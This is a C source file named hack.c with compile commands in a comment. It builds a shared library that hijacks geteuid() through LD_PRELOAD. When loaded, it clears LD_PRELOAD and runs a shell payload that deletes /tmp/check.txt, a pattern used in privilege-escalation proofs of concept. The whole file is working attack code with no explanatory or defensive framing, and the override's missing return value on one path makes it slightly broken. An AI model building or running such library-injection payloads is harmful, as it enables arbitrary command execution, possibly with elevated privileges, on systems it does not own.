#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
void payload() {
        system("rm /tmp/check.txt");
}  
 
int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}

/*
$ gcc -c -fPIC hack.c -o hack
$ gcc -shared hack -o hack.so
 */